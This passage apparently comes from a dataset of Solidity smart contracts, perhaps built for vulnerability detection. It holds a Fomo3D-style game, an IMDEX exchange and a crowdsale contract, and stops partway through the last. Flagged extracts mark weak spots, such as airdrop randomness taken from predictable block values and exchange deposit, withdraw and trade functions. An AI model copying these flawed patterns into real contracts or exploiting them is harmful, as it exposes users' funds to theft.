(1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask) );\n }\n function calcKeysReceived(uint256 _rID, uint256 _eth)\n public\n view\n returns(uint256)\n {\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].eth).keysRec(_eth) );\n else\n return ( (_eth).keys() );\n }\n function iWantXKeys(uint256 _keys)\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );\n else\n return ( (_keys).eth() );\n }\n function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if (pIDxAddr_[_addr] != _pID)\n pIDxAddr_[_addr] = _pID;\n if (pIDxName_[_name] != _pID)\n pIDxName_[_name] = _pID;\n if (plyr_[_pID].addr != _addr)\n plyr_[_pID].addr = _addr;\n if (plyr_[_pID].name != _name)\n plyr_[_pID].name = _name;\n if (plyr_[_pID].laff != _laff)\n plyr_[_pID].laff = _laff;\n if (plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function receivePlayerNameList(uint256 _pID, bytes32 _name)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if(plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function determinePID(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_pID == 0)\n {\n _pID = PlayerBook.getPlayerID(msg.sender);\n bytes32 _name = PlayerBook.getPlayerName(_pID);\n uint256 _laff = PlayerBook.getPlayerLAff(_pID);\n pIDxAddr_[msg.sender] = _pID;\n plyr_[_pID].addr = msg.sender;\n if (_name != \"\")\n {\n pIDxName_[_name] = _pID;\n plyr_[_pID].name = _name;\n plyrNames_[_pID][_name] = true;\n }\n if (_laff != 0 && _laff != _pID)\n plyr_[_pID].laff = _laff;\n _eventData_.compressedData = _eventData_.compressedData + 1;\n }\n return (_eventData_);\n }\n function verifyTeam(uint256 _team)\n private\n pure\n returns (uint256)\n {\n if (_team < 0 || _team > 3)\n return(2);\n else\n return(_team);\n }\n function managePlayer(uint256 _pID, PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n if (plyr_[_pID].lrnd != 0)\n updateGenVault(_pID, plyr_[_pID].lrnd);\n plyr_[_pID].lrnd = rID_;\n _eventData_.compressedData = _eventData_.compressedData + 10;\n return(_eventData_);\n }\n function nextRound() private {\n rID_++;\n round_[rID_].strt = now;\n round_[rID_].end = now.add(rndInit_).add(rndGap_);\n }\n function endRound(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _rID = rID_;\n uint256 _winPID = round_[_rID].plyr;\n uint256 _winTID = round_[_rID].team;\n uint256 _pot = round_[_rID].pot;\n uint256 _win = (_pot.mul(48)) / 100;\n uint256 _com = (_pot / 50);\n uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;\n uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;\n uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);\n if (_dust > 0)\n {\n _gen = _gen.sub(_dust);\n _res = _res.add(_dust);\n }\n plyr_[_winPID].win = _win.add(plyr_[_winPID].win);\n admin.transfer(_com.add(_p3d.sub(_p3d / 2)));\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n _res = _res.add(_p3d / 2);\n _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);\n _eventData_.winnerAddr = plyr_[_winPID].addr;\n _eventData_.winnerName = plyr_[_winPID].name;\n _eventData_.amountWon = _win;\n _eventData_.genAmount = _gen;\n _eventData_.PCPAmount = _p3d;\n _eventData_.newPot = _res;\n round_[_rID].pot = 0;\n _rID++;\n round_[_rID].ended = false;\n round_[_rID].strt = now;\n round_[_rID].end = now.add(rndInit_).add(rndGap_);\n round_[_rID].pot = (round_[_rID].pot).add(_res);\n return(_eventData_);\n }\n function updateGenVault(uint256 _pID, uint256 _rIDlast)\n private\n {\n uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);\n if (_earnings > 0)\n {\n plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);\n plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);\n }\n }\n function updateTimer(uint256 _keys, uint256 _rID, uint256 _eth)\n private\n {\n uint256 _now = now;\n uint256 _newTime;\n if (_now > round_[_rID].end && round_[_rID].plyr == 0)\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);\n else\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);\n uint256 _newEndTime;\n if (_newTime < (rndMax_).add(_now))\n _newEndTime = _newTime;\n else\n _newEndTime = rndMax_.add(_now);\n if ( _eth >= rndReduceThreshold_ ) {\n uint256 reduce = ((((_keys) / (1000000000000000000))).mul(rndInc_ * reduceMul_) / reduceDiv_);\n if( _newEndTime > reduce && _now + rndMin_ + reduce < _newEndTime){\n _newEndTime = (_newEndTime).sub(reduce);\n }\n else if ( _newEndTime > reduce ){\n _newEndTime = _now + rndMin_;\n }\n }\n round_[_rID].end = _newEndTime;\n }\n function getReduce(uint256 _rID, uint256 _eth) public view returns(uint256,uint256){\n uint256 _keys = calcKeysReceived(_rID, _eth);\n if ( _eth >= rndReduceThreshold_ ) {\n return ( ((((_keys) / (1000000000000000000))).mul(rndInc_ * reduceMul_) / reduceDiv_), (((_keys) / (1000000000000000000)).mul(rndInc_)) );\n } else {\n return (0, (((_keys) / (1000000000000000000)).mul(rndInc_)) );\n }\n }\n function airdrop() private view returns(bool) {\n uint256 seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n (block.number)\n )));\n if((seed - ((seed / 1000) * 1000)) < airDropTracker_)\n return(true);\n else\n return(false);\n }\n function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _com = _eth / 50;\n uint256 _p3d;\n if (!address(admin).call.value(_com)()) {\n _p3d = _com;\n _com = 0;\n }\n uint256 _long = _eth / 100;\n potSwap(_long);\n uint256 _aff = _eth / 10;\n if (_affID != _pID && plyr_[_affID].name != '') {\n plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);\n emit PCKevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);\n } else {\n _p3d = _aff;\n }\n _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));\n if (_p3d > 0)\n {\n admin.transfer(_p3d.sub(_p3d / 2));\n round_[_rID].pot = round_[_rID].pot.add(_p3d / 2);\n _eventData_.PCPAmount = _p3d.add(_eventData_.PCPAmount);\n }\n return(_eventData_);\n }\n function potSwap(uint256 _pot) private {\n uint256 _rID = rID_ + 1;\n round_[_rID].pot = round_[_rID].pot.add(_pot);\n emit PCKevents.onPotSwapDeposit(_rID, _pot);\n }\n function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;\n uint256 _air = (_eth / 100);\n airDropPot_ = airDropPot_.add(_air);\n _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));\n uint256 _pot = _eth.sub(_gen);\n uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);\n if (_dust > 0)\n _gen = _gen.sub(_dust);\n round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);\n _eventData_.genAmount = _gen.add(_eventData_.genAmount);\n _eventData_.potAmount = _pot;\n return(_eventData_);\n }\n function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)\n private\n returns(uint256)\n {\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);\n plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);\n return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));\n }\n function withdrawEarnings(uint256 _pID)\n private\n returns(uint256)\n {\n updateGenVault(_pID, plyr_[_pID].lrnd);\n uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);\n if (_earnings > 0)\n {\n plyr_[_pID].win = 0;\n plyr_[_pID].gen = 0;\n plyr_[_pID].aff = 0;\n }\n return(_earnings);\n }\n function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);\n emit PCKevents.onEndTx\n (\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n plyr_[_pID].name,\n msg.sender,\n _eth,\n _keys,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount,\n _eventData_.potAmount,\n airDropPot_\n );\n }\n bool public activated_ = false;\n function activate() public {\n require(\n msg.sender == admin,\n \"only team just can activate\"\n );\n require(activated_ == false, \"PCK already activated\");\n activated_ = true;\n rID_ = 1;\n round_[1].strt = now + rndExtra_ - rndGap_;\n round_[1].end = now + rndInit_ + rndExtra_;\n }\n}\nlibrary PCKdatasets {\n struct EventReturns {\n uint256 compressedData;\n uint256 compressedIDs;\n address winnerAddr;\n bytes32 winnerName;\n uint256 amountWon;\n uint256 newPot;\n uint256 PCPAmount;\n uint256 genAmount;\n uint256 potAmount;\n }\n struct Player {\n address addr;\n bytes32 name;\n uint256 win;\n uint256 gen;\n uint256 aff;\n uint256 lrnd;\n uint256 laff;\n }\n struct PlayerRounds {\n uint256 eth;\n uint256 keys;\n uint256 mask;\n uint256 ico;\n }\n struct Round {\n uint256 plyr;\n uint256 team;\n uint256 end;\n bool ended;\n uint256 strt;\n uint256 keys;\n uint256 eth;\n uint256 pot;\n uint256 mask;\n uint256 ico;\n uint256 icoGen;\n uint256 icoAvg;\n }\n struct TeamFee {\n uint256 gen;\n uint256 p3d;\n }\n struct PotSplit {\n uint256 gen;\n uint256 p3d;\n }\n}\nlibrary PCKKeysCalcLong {\n using SafeMath for *;\n function keysRec(uint256 _curEth, uint256 _newEth)\n internal\n pure\n returns (uint256)\n {\n return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));\n }\n function ethRec(uint256 _curKeys, uint256 _sellKeys)\n internal\n pure\n returns (uint256)\n {\n return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));\n }\n function keys(uint256 _eth)\n internal\n pure\n returns(uint256)\n {\n return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);\n }\n function eth(uint256 _keys)\n internal\n pure\n returns(uint256)\n {\n return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());\n }\n}\ninterface PCKExtSettingInterface {\n function getFastGap() external view returns(uint256);\n function getLongGap() external view returns(uint256);\n function getFastExtra() external view returns(uint256);\n function getLongExtra() external view returns(uint256);\n}\ninterface PlayCoinGodInterface {\n function deposit() external payable;\n}\ninterface ProForwarderInterface {\n function deposit() external payable returns(bool);\n function status() external view returns(address, address, bool);\n function startMigration(address _newCorpBank) external returns(bool);\n function cancelMigration() external returns(bool);\n function finishMigration() external returns(bool);\n function setup(address _firstCorpBank) external;\n}\ninterface PlayerBookInterface {\n function getPlayerID(address _addr) external returns (uint256);\n function getPlayerName(uint256 _pID) external view returns (bytes32);\n function getPlayerLAff(uint256 _pID) external view returns (uint256);\n function getPlayerAddr(uint256 _pID) external view returns (address);\n function getNameFee() external view returns (uint256);\n function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);\n}\nlibrary NameFilter {\n function nameFilter(string _input)\n internal\n pure\n returns(bytes32)\n {\n bytes memory _temp = bytes(_input);\n uint256 _length = _temp.length;\n require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\");\n require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\");\n if (_temp[0] == 0x30)\n {\n require(_temp[1] != 0x78, \"string cannot start with 0x\");\n require(_temp[1] != 0x58, \"string cannot start with 0X\");\n }\n bool _hasNonNumber;\n for (uint256 i = 0; i < _length; i++)\n {\n if (_temp[i] > 0x40 && _temp[i] < 0x5b)\n {\n _temp[i] = byte(uint(_temp[i]) + 32);\n if (_hasNonNumber == false)\n _hasNonNumber = true;\n } else {\n require\n (\n _temp[i] == 0x20 ||\n (_temp[i] > 0x60 && _temp[i] < 0x7b) ||\n (_temp[i] > 0x2f && _temp[i] < 0x3a),\n \"string contains invalid characters\"\n );\n if (_temp[i] == 0x20)\n require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\");\n if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))\n _hasNonNumber = true;\n }\n }\n require(_hasNonNumber == true, \"string cannot be only numbers\");\n bytes32 _ret;\n assembly {\n _ret := mload(add(_temp, 32))\n }\n return (_ret);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n require(c / a == b, \"SafeMath mul failed\");\n return c;\n }\n function sub(uint256 a, uint256 b)\n internal\n pure\n returns (uint256)\n {\n require(b <= a, \"SafeMath sub failed\");\n return a - b;\n }\n function add(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n c = a + b;\n require(c >= a, \"SafeMath add failed\");\n return c;\n }\n function sqrt(uint256 x)\n internal\n pure\n returns (uint256 y)\n {\n uint256 z = ((add(x,1)) / 2);\n y = x;\n while (z < y)\n {\n y = z;\n z = ((add((x / z),z)) / 2);\n }\n }\n function sq(uint256 x)\n internal\n pure\n returns (uint256)\n {\n return (mul(x,x));\n }\n function pwr(uint256 x, uint256 y)\n internal\n pure\n returns (uint256)\n {\n if (x==0)\n return (0);\n else if (y==0)\n return (1);\n else\n {\n uint256 z = x;\n for (uint256 i=1; i < y; i++)\n z = mul(z,x);\n return (z);\n }\n }\n}",
  "extract_feature": [
    "function airdrop() private view returns(bool) {\nuint256 seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n(block.number)\n)));\nif((seed - ((seed / 1000) * 1000)) < airDropTracker_)\nreturn(true);\nelse\nreturn(false);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b60"
  },
  "filename": "2963.sol",
  "content": "pragma solidity ^0.4.23;\ncontract IMDEX {\n bytes32 public standard;\n bytes32 public name;\n bytes32 public symbol;\n uint256 public totalSupply;\n uint8 public decimals;\n bool public allowTransactions;\n mapping (address => uint256) public balanceOf;\n mapping (address => mapping (address => uint256)) public allowance;\n function transfer(address _to, uint256 _value)public returns (bool success);\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n}\ncontract SafeMath {\n function safeMul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract IMDEXDexchange is SafeMath {\n address public owner;\n address IMDEXtoken = 0x46705E8fef2E868FACAFeDc45F47114EC01c2EEd;\n mapping (address => uint256) public invalidOrder;\n event SetOwner(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function IMDEXsetOwner(address newOwner)public onlyOwner {\n emit SetOwner(owner, newOwner);\n owner = newOwner;\n }\n function IMDEXinvalidateOrdersBefore(address user, uint256 nonce) public onlyAdmin {\n require(nonce > invalidOrder[user]);\n invalidOrder[user] = nonce;\n }\n mapping (address => mapping (address => uint256)) public tokens;\n mapping (address => bool) public admins;\n mapping (address => uint256) public lastActiveTransaction;\n address public feeAccount;\n uint256 public inactivityReleasePeriod;\n event Trade(address tokenBuy, uint256 amountBuy, address tokenSell, uint256 amountSell, address get, address give);\n event Deposit(address token, address user, uint256 amount, uint256 balance);\n event Withdraw(address token, address user, uint256 amount, uint256 balance);\n function IMDEXsetInactivityReleasePeriod(uint256 expiry) public onlyAdmin returns (bool success) {\n require(expiry < 1000000);\n inactivityReleasePeriod = expiry;\n return true;\n }\n constructor(address feeAccount_) public {\n owner = msg.sender;\n feeAccount = feeAccount_;\n inactivityReleasePeriod = 100000;\n }\n function IMDEXsetAdmin(address admin, bool isAdmin) public onlyOwner {\n admins[admin] = isAdmin;\n }\n modifier onlyAdmin {\n require(msg.sender == owner && admins[msg.sender]);\n _;\n }\n function() external {\n revert();\n }\n function IMDEXdepositToken(address token, uint256 amount) public {\n tokens[token][msg.sender] = safeAdd(tokens[token][msg.sender], amount);\n lastActiveTransaction[msg.sender] = block.number;\n require(IMDEX(token).transferFrom(msg.sender, this, amount));\n emit Deposit(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function IMDEXdeposit() public payable {\n tokens[address(0)][msg.sender] = safeAdd(tokens[address(0)][msg.sender], msg.value);\n lastActiveTransaction[msg.sender] = block.number;\n emit Deposit(address(0), msg.sender, msg.value, tokens[address(0)][msg.sender]);\n }\n function IMDEXwithdrawToken(address token, uint256 amount) public returns (bool) {\n require(safeSub(block.number, lastActiveTransaction[msg.sender]) > inactivityReleasePeriod);\n require(tokens[token][msg.sender] > amount);\n tokens[token][msg.sender] = safeSub(tokens[token][msg.sender], amount);\n if (token == address(0)) {\n msg.sender.transfer(amount);\n } else {\n require(IMDEX(token).transfer(msg.sender, amount));\n }\n emit Withdraw(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function IMDEXadminWithdraw(address token, uint256 amount, address user, uint256 feeWithdrawal) public onlyAdmin returns (bool) {\n if (feeWithdrawal > 50 finney) feeWithdrawal = 50 finney;\n require(tokens[token][user] > amount);\n tokens[token][user] = safeSub(tokens[token][user], amount);\n tokens[token][feeAccount] = safeAdd(tokens[token][feeAccount], safeMul(feeWithdrawal, amount) / 1 ether);\n amount = safeMul((1 ether - feeWithdrawal), amount) / 1 ether;\n if (token == address(0)) {\n user.transfer(amount);\n } else {\n require(IMDEX(token).transfer(user, amount));\n }\n lastActiveTransaction[user] = block.number;\n emit Withdraw(token, user, amount, tokens[token][user]);\n }\n function balanceOf(address token, address user) public constant returns (uint256) {\n return tokens[token][user];\n }\n function IMDEXtrade(uint256[8] X, address[4] Y) public onlyAdmin returns (bool) {\n require(invalidOrder[Y[2]] < X[3]);\n if (X[6] > 100 finney) X[6] = 100 finney;\n if (X[7] > 100 finney) X[7] = 100 finney;\n require(tokens[Y[0]][Y[3]] > X[4]);\n require(tokens[Y[1]][Y[2]] > (safeMul(X[1], X[4]) / X[0]));\n tokens[Y[0]][Y[3]] = safeSub(tokens[Y[0]][Y[3]], X[4]);\n tokens[Y[0]][Y[2]] = safeAdd(tokens[Y[0]][Y[2]], safeMul(X[4], ((1 ether) - X[6])) / (1 ether));\n tokens[Y[0]][feeAccount] = safeAdd(tokens[Y[0]][feeAccount], safeMul(X[4], X[6]) / (1 ether));\n tokens[Y[1]][Y[2]] = safeSub(tokens[Y[1]][Y[2]], safeMul(X[1], X[4]) / X[0]);\n tokens[Y[1]][Y[3]] = safeAdd(tokens[Y[1]][Y[3]], safeMul(safeMul(((1 ether) - X[7]), X[1]), X[4]) / X[0] / (1 ether));\n tokens[Y[1]][feeAccount] = safeAdd(tokens[Y[1]][feeAccount], safeMul(safeMul(X[7], X[1]), X[4]) / X[0] / (1 ether));\n lastActiveTransaction[Y[2]] = block.number;\n lastActiveTransaction[Y[3]] = block.number;\n }\n}",
  "extract_feature": [
    "function IMDEXdepositToken(address token, uint256 amount) public {\ntokens[token][msg.sender] = safeAdd(tokens[token][msg.sender], amount);\nlastActiveTransaction[msg.sender] = block.number;\nrequire(IMDEX(token).transferFrom(msg.sender, this, amount));\nemit Deposit(token, msg.sender, amount, tokens[token][msg.sender]);\n}",
    "function IMDEXdeposit() public payable {\ntokens[address(0)][msg.sender] = safeAdd(tokens[address(0)][msg.sender], msg.value);\nlastActiveTransaction[msg.sender] = block.number;\nemit Deposit(address(0), msg.sender, msg.value, tokens[address(0)][msg.sender]);\n}",
    "function IMDEXwithdrawToken(address token, uint256 amount) public returns (bool) {\nrequire(safeSub(block.number, lastActiveTransaction[msg.sender]) > inactivityReleasePeriod);\nrequire(tokens[token][msg.sender] > amount);\ntokens[token][msg.sender] = safeSub(tokens[token][msg.sender], amount);\nif (token == address(0)) {\nmsg.sender.transfer(amount);\n} else {\nrequire(IMDEX(token).transfer(msg.sender, amount));\n}\nemit Withdraw(token, msg.sender, amount, tokens[token][msg.sender]);\n}",
    "function IMDEXadminWithdraw(address token, uint256 amount, address user, uint256 feeWithdrawal) public onlyAdmin returns (bool) {\nif (feeWithdrawal > 50 finney) feeWithdrawal = 50 finney;\nrequire(tokens[token][user] > amount);\ntokens[token][user] = safeSub(tokens[token][user], amount);\ntokens[token][feeAccount] = safeAdd(tokens[token][feeAccount], safeMul(feeWithdrawal, amount) / 1 ether);\namount = safeMul((1 ether - feeWithdrawal), amount) / 1 ether;\nif (token == address(0)) {\nuser.transfer(amount);\n} else {\nrequire(IMDEX(token).transfer(user, amount));\n}\nlastActiveTransaction[user] = block.number;\nemit Withdraw(token, user, amount, tokens[token][user]);\n}",
    "function IMDEXtrade(uint256[8] X, address[4] Y) public onlyAdmin returns (bool) {\nrequire(invalidOrder[Y[2]] < X[3]);\nif (X[6] > 100 finney) X[6] = 100 finney;\nif (X[7] > 100 finney) X[7] = 100 finney;\nrequire(tokens[Y[0]][Y[3]] > X[4]);\nrequire(tokens[Y[1]][Y[2]] > (safeMul(X[1], X[4]) / X[0]));\ntokens[Y[0]][Y[3]] = safeSub(tokens[Y[0]][Y[3]], X[4]);\ntokens[Y[0]][Y[2]] = safeAdd(tokens[Y[0]][Y[2]], safeMul(X[4], ((1 ether) - X[6])) / (1 ether));\ntokens[Y[0]][feeAccount] = safeAdd(tokens[Y[0]][feeAccount], safeMul(X[4], X[6]) / (1 ether));\ntokens[Y[1]][Y[2]] = safeSub(tokens[Y[1]][Y[2]], safeMul(X[1], X[4]) / X[0]);\ntokens[Y[1]][Y[3]] = safeAdd(tokens[Y[1]][Y[3]], safeMul(safeMul(((1 ether) - X[7]), X[1]), X[4]) / X[0] / (1 ether));\ntokens[Y[1]][feeAccount] = safeAdd(tokens[Y[1]][feeAccount], safeMul(safeMul(X[7], X[1]), X[4]) / X[0] / (1 ether));\nlastActiveTransaction[Y[2]] = block.number;\nlastActiveTransaction[Y[3]] = block.number;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b61"
  },
  "filename": "2977.sol",
  "content": "pragma solidity ^0.4.24;\ncontract TokenInfo {\n uint256 public constant PRIVATESALE_BASE_PRICE_IN_WEI = 200000000000000;\n uint256 public constant PRESALE_BASE_PRICE_IN_WEI = 600000000000000;\n uint256 public constant ICO_BASE_PRICE_IN_WEI = 800000000000000;\n uint256 public constant FIRSTSALE_BASE_PRICE_IN_WEI = 200000000000000;\n uint256 public constant MIN_PURCHASE_OTHERSALES = 80000000000000000;\n uint256 public constant MIN_PURCHASE = 1000000000000000000;\n uint256 public constant MAX_PURCHASE = 1000000000000000000000;\n uint256 public constant PRESALE_PERCENTAGE_1 = 10;\n uint256 public constant PRESALE_PERCENTAGE_2 = 15;\n uint256 public constant PRESALE_PERCENTAGE_3 = 20;\n uint256 public constant PRESALE_PERCENTAGE_4 = 25;\n uint256 public constant PRESALE_PERCENTAGE_5 = 35;\n uint256 public constant ICO_PERCENTAGE_1 = 5;\n uint256 public constant ICO_PERCENTAGE_2 = 10;\n uint256 public constant ICO_PERCENTAGE_3 = 15;\n uint256 public constant ICO_PERCENTAGE_4 = 20;\n uint256 public constant ICO_PERCENTAGE_5 = 25;\n uint256 public constant PRESALE_LEVEL_1 = 5000000000000000000;\n uint256 public constant PRESALE_LEVEL_2 = 10000000000000000000;\n uint256 public constant PRESALE_LEVEL_3 = 15000000000000000000;\n uint256 public constant PRESALE_LEVEL_4 = 20000000000000000000;\n uint256 public constant PRESALE_LEVEL_5 = 25000000000000000000;\n uint256 public constant ICO_LEVEL_1 = 6666666666666666666;\n uint256 public constant ICO_LEVEL_2 = 13333333333333333333;\n uint256 public constant ICO_LEVEL_3 = 20000000000000000000;\n uint256 public constant ICO_LEVEL_4 = 26666666666666666666;\n uint256 public constant ICO_LEVEL_5 = 33333333333333333333;\n uint256 public constant PRIVATESALE_TOKENCAP = 18750000;\n uint256 public constant PRESALE_TOKENCAP = 18750000;\n uint256 public constant ICO_TOKENCAP = 22500000;\n uint256 public constant FIRSTSALE_TOKENCAP = 5000000;\n uint256 public constant LEDTEAM_TOKENS = 35000000;\n uint256 public constant TOTAL_TOKENCAP = 100000000;\n uint256 public constant DECIMALS_MULTIPLIER = 1 ether;\n address public constant LED_MULTISIG = 0x865e785f98b621c5fdde70821ca7cea9eeb77ef4;\n}\ncontract Ownable {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n constructor() public {}\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused {\n require(paused);\n _;\n }\n function pause() public onlyOwner whenNotPaused returns (bool) {\n paused = true;\n emit Pause();\n return true;\n }\n function unpause() public onlyOwner whenPaused returns (bool) {\n paused = false;\n emit Unpause();\n return true;\n }\n}\ncontract ApproveAndCallReceiver {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract Controllable {\n address public controller;\n constructor() public {\n controller = msg.sender;\n }\n modifier onlyController() {\n require(msg.sender == controller);\n _;\n }\n function transferControl(address newController) public onlyController {\n if (newController != address(0)) {\n controller = newController;\n }\n }\n}\ncontract ControllerInterface {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public returns(bool);\n}\ncontract ERC20 {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n function transferFrom(address _from, address _to, uint256 _amount) public returns (bool);\n function approve(address _spender, uint256 _amount) public returns (bool);\n function allowance(address _owner, address _spender) public constant returns (uint256);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Crowdsale is Pausable, TokenInfo {\n using SafeMath for uint256;\n LedTokenInterface public ledToken;\n uint256 public startTime;\n uint256 public endTime;\n uint256 public totalWeiRaised;\n uint256 public tokensMinted;\n uint256 public totalSupply;\n uint256 public contributors;\n uint256 public surplusTokens;\n bool public finalized;\n bool public ledTokensAllocated;\n address public ledMultiSig = LED_MULTISIG;\n bool public started = false;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n event NewClonedToken(address indexed _cloneToken);\n event OnTransfer(address _from, address _to, uint _amount);\n event OnApprove(address _owner, address _spender, uint _amount);\n event LogInt(string _name, uint256 _value);\n event Finalized();\n function forwardFunds() internal {\n ledMultiSig.transfer(msg.value);\n }\n function validPurchase() internal constant returns 